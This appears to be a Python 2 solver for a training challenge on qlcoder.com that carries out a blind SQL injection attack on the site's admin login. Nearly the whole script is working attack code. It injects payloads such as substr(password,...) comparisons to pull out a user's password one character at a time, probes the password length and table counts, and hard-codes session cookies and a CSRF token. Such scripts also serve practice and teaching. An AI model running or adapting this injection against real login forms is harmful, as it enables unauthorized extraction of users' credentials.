# coding:utf-8

import urllib2
import urllib

headers = {
    'Cookie': 'gr_user_id=3949c66a-56d6-49be-99e6-dc48710481cd; uuid=5811c0d121dd4; è¿é¢çç­æ¡æ¯oreo=eyJpdiI6Ik13RVwvTVlPd0pHMGFkWTJFdElndnhRPT0iLCJ2YWx1ZSI6ImJKUlMxaFA4a1lYV2J3b0NnN0ZUS1E9PSIsIm1hYyI6ImRjZTBjYjU4NDg5ZjNjYjk5OGNmZmE0MTk2MWU1NmIyMTA4NmViMmM2OWUxYTA3NjdhYjNiODdlOTNkMmFlNTYifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IndsTFlJekoreDNFcTltQjJvQWYwNVE9PSIsInZhbHVlIjoiYis4SnV6SjliMWRhRVc0VnJzOVNCZGd6THREVENtOVR2ejV5QUQwRVNLdElFa2taeCs3cWJteVBseVdhdXJ2ZEI3SWRPd3pmNnRXSHNaeERBcVdaRHc9PSIsIm1hYyI6IjBhODM4MjczODQ3MmU3MDgzNWQ2OThiMGVmYzdkMjEzNWNhOWRiNmMxMjgzNDlkYjI1ZjBlYjMxYWU0NjVhZjcifQ%3D%3D; laravel_session=eyJpdiI6IkpPWGlaWXBmSWkzYVwvdE5NYTdUbWR3PT0iLCJ2YWx1ZSI6IndxZXN4MUdFc0pQTkFLZENWM1ZxMmxuMkRzODh0R0dUQ2liVVlJYlZkTmpodUVnR3g0YzR2bnRMNVBiR1hkMkhMdHN1RXFyY3NJME12VGtTWUFYa0pnPT0iLCJtYWMiOiI1NjAxODE1MjM5YjNiYzYyMDE5NjBlZTRlNWNlOWYxNzllY2Y5NjQ1ZThlNjI3N2MwOWI1YmY1ZWFmNDgyZTdlIn0%3D; gr_session_id_80dfd8ec4495dedb=00c7f621-140a-44d1-b53c-d356c37de177; Hm_lvt_420590b976ac0a82d0b82a80985a3b8a=1477531541,1477533371,1477535066,1477558482; Hm_lpvt_420590b976ac0a82d0b82a80985a3b8a=1477566715',
}

data = {
    '_token': 'XaWes4eXOqUlBXv4c5LtQuqqiwIQ4ZZLpg6HHHvE',
    'username': '',
    'password': ''
}

fail_message = '账号或密码错误'
suc_message = '恭喜你,这题的答案是 c3p0'


def get_token(username_sql):
    request = urllib2.Request('http://www.qlcoder.com/train/admin', headers=headers)
    data['username'] = username_sql
    data_str = urllib.urlencode(data)
    global response_stream
    try:
        response_stream = urllib2.urlopen(request, data_str)
        html_str = response_stream.read()
        return html_str
    except urllib2.HTTPError as err:
        print 'sql syntax error'
        print ''.join(err.readlines())


def is_successful(html):
    if fail_message in html:
        print 'fail'
        return False
    elif suc_message in html:
        print 'sucess'
        return True
    else:
        print 'error syntax'
        return False


for j in range(1, 61):
    print 'passwd',j,':'
    for i in range(32, 127):
        html = get_token("shinian' and substr(password," + str(j) + ",1)='" + chr(i) + "'# ")
        if fail_message in html:
            continue
            # print 'fail'
        elif suc_message in html:
            print 'sucess', chr(i)
            break
        else:
            print 'error syntax'


def get_passwd_len():
    for i in range(55, 70):
        html = get_token("shinian' and length(password)='" + str(i) + "'# ")
        if is_successful(html):
            print i


html = get_token("shinian' and " + "(select count(*) from information_schema.tables)<100" + "'# ")
